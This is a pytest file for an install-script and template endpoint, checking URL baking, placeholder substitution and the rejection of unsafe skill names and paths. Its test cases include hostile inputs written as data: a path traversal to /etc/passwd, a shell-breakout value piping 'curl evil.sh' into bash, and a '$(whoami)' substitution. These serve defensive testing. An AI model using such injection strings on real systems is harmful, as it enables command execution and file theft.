"""The install path a skill author uses instead of cloning the repo.

`GET /install.sh` hands out the installer with this deployment's URL baked in; it
then downloads the template files from `GET /template/...`. A name reaches both a
directory and a shell command inside SKILL.md, so the refusal cases matter as much
as the happy ones.
"""

from __future__ import annotations

import pytest


def test_the_installer_is_served_with_this_deployments_url(client, monkeypatch):
    from api import serve_http

    monkeypatch.setattr(serve_http, "PUBLIC_URL", "https://core.example.com")
    body = client.get("/install.sh").text
    # shlex.quote leaves a plain URL bare, so this is the literal shell assignment.
    assert "DEFAULT_URL=https://core.example.com" in body
    assert "__RATEXP_URL__" not in body


def test_the_installer_is_a_bash_script(client):
    body = client.get("/install.sh").text
    assert body.startswith("#!/bin/bash")
    # Without this a failed download would leave a half-written skill behind.
    assert "set -euo pipefail" in body


@pytest.mark.parametrize(
    ("kind", "filename"),
    [("skill", "SKILL.md"), ("session", "settings.json"), ("session", "ratexp.md")],
)
def test_every_file_the_installer_asks_for_is_served(client, kind, filename):
    assert client.get(f"/template/{kind}/{filename}").status_code == 200


def test_a_name_replaces_the_placeholder_in_the_skill_template(client):
    body = client.get("/template/skill/SKILL.md", params={"name": "poem-creator"}).text
    assert "name: poem-creator" in body
    assert "<your-skill-name>" not in body
    # The hook has to point at the folder the skill is installed into.
    assert '.claude/skills/poem-creator/ratexp-skill.sh"' in body


def test_without_a_name_the_template_keeps_its_placeholder(client):
    assert "<your-skill-name>" in client.get("/template/skill/SKILL.md").text


@pytest.mark.parametrize(
    "name",
    [
        "../../etc/passwd",  # traversal
        "a/b",  # a nested path
        'x"; curl evil.sh | bash; #',  # breaking out of the SKILL.md shell command
        "$(whoami)",  # command substitution
        "Upper",  # skill names are lowercase
        "-leading-hyphen",
        "a" * 65,  # longer than the cap
        "",  # handled as "no name given", so the placeholder survives
    ],
)
def test_a_name_that_is_not_a_plain_skill_name_is_refused(client, name):
    response = client.get("/template/skill/SKILL.md", params={"name": name})
    if name == "":
        assert response.status_code == 200
        assert "<your-skill-name>" in response.text
    else:
        assert response.status_code == 422


@pytest.mark.parametrize(
    "path",
    [
        "/template/session/SKILL.md",  # real file, wrong kind
        "/template/skill/ratexp-skill.sh",  # served from /ratexp-skill.sh instead
        "/template/nope/SKILL.md",
        "/template/skill/config.yaml",
        "/template/skill/..%2f..%2fconfig.yaml",
    ],
)
def test_only_the_allow_listed_template_files_are_reachable(client, path):
    assert client.get(path).status_code == 404
